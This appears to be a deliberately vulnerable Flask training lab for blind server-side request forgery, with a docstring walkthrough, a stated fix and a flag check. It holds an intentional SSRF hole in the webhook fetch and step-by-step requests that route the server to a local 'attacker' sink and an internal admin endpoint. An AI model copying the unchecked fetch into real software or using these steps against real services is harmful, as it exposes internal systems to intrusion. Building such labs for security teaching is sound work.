"""
Lab 72 -- Blind SSRF via a webhook URL, only confirmable out-of-band.

/webhook/register stores a URL; /webhook/trigger fires a server-side
POST at it. Unlike every other SSRF lab here (05's /fetch, 40's cloud
metadata, 64's redirect bypass, 65's image-embed export), the response
NEVER carries the fetched content, the target's status code, or even
whether the fetch succeeded -- /webhook/trigger always answers
{"status":"queued"} immediately, win or fail. That is the point: this
is the class of SSRF Burp's Collaborator was built for. An SSRF whose
response is visible is confirmable by reading the reply; a blind one
is only confirmable by making the server call somewhere YOU control
and watching for the callback to land, out-of-band, on your own clock.

The vulnerable code path also reaches an "internal-only" admin action
(a stand-in for the kind of firewalled management endpoint a real blind
SSRF pivots into -- password rotation, an internal API, a metadata
service) that the webhook fetch can trigger with zero indication in the
HTTP response that anything happened at all.

Run:
    pip install flask requests
    python app.py

In Nullock:
    1. Start Nullock's OAST sink and mint a token (Collaborator tab, or
       `nullock oast mint`). This lab's own /attacker/sink/<label>
       stands in for that OAST domain if you'd rather stay offline --
       either way you need an out-of-band listener, because nothing
       this app sends back will tell you anything.
    2. POST /webhook/register {"url": "<your OAST callback URL, or
       http://127.0.0.1:5072/attacker/sink/evil>"} -- note the returned
       id. POST /webhook/trigger {"id": <id>}. The response is always
       {"status": "queued"} -- compare that to lab 05's /fetch, which
       echoes the target's actual response body back to you.
    3. Watch your OAST sink (`nullock oast watch`) or GET
       /attacker/sink/evil/log -- the callback lands there moments
       later, proving the server made the request even though its own
       HTTP response told you nothing.
    4. Now register a webhook pointed at the internal admin action:
       POST /webhook/register {"url":
       "http://127.0.0.1:5072/internal/admin/rotate-keys"}, then
       POST /webhook/trigger with that id. Same blind {"status":
       "queued"} reply -- but the action fired server-side.
    5. Confirm success: GET /flag?id=<that id> -- the app's own
       out-of-band record (not the trigger response) shows that id's
       webhook reached the internal admin action.

Fix: never let a server-controlled fetch target be attacker-supplied
without an allow-list, blind or not -- but blind SSRF specifically also
means never assume "the response didn't confirm it" means "it didn't
happen": treat any outbound fetch whose target isn't pinned to a
known-safe destination as a live SSRF primitive, response body or not.
"""

import hashlib
import uuid
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

FLAG = "NULLOCK{%s}" % hashlib.sha256(b"lab-72-blind-ssrf-oast").hexdigest()[:16]

WEBHOOKS = {}     # id -> url
SINK_LOG = {}     # label -> [hit dicts]
ROTATED_BY = set()  # ids whose triggered webhook reached the internal admin action

@app.route("/")
def index():
    return ("<h3>Webhook notifications</h3>"
            "<p>POST /webhook/register {url}, then POST /webhook/trigger {id}.</p>")

@app.route("/webhook/register", methods=["POST"])
def webhook_register():
    body = request.get_json(silent=True) or {}
    url = body.get("url", "")
    if not url:
        return jsonify(error="missing url"), 400
    # VULN: no allow-list on the registered URL -- any host, any scheme requests handles.
    wid = uuid.uuid4().hex[:12]
    WEBHOOKS[wid] = url
    return jsonify(id=wid)

@app.route("/webhook/trigger", methods=["POST"])
def webhook_trigger():
    body = request.get_json(silent=True) or {}
    wid = body.get("id", "")
    url = WEBHOOKS.get(wid)
    # VULN (blind): fire-and-forget. Response never reflects success, failure,
    # status code, or body -- there is no oracle here except an OOB callback.
    if url:
        try:
            r = requests.post(url, json={"event": "notify", "webhook_id": wid}, timeout=3)
            if url.rstrip("/").endswith("/internal/admin/rotate-keys") and r.status_code == 200:
                ROTATED_BY.add(wid)
        except Exception:
            pass
    return jsonify(status="queued")

@app.route("/internal/admin/rotate-keys", methods=["GET", "POST"])
def internal_rotate_keys():
    # Stand-in for a firewalled internal-only admin action -- only reachable
    # server-side in a real deployment, never routable from outside directly.
    return jsonify(rotated=True)

@app.route("/attacker/sink/<label>", methods=["GET", "POST"])
def attacker_sink(label):
    # Stand-in for an attacker-controlled OAST-style collaborator domain.
    if request.method == "POST":
        SINK_LOG.setdefault(label, []).append(request.get_json(silent=True) or {})
        return jsonify(received=True)
    return jsonify(hits=SINK_LOG.get(label, []))

@app.route("/attacker/sink/<label>/log")
def attacker_sink_log(label):
    return jsonify(hits=SINK_LOG.get(label, []))

@app.route("/flag")
def flag():
    wid = request.args.get("id", "")
    if wid and wid in ROTATED_BY:
        return jsonify(solved=True, flag=FLAG)
    return jsonify(solved=False), 403

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5072, debug=False)
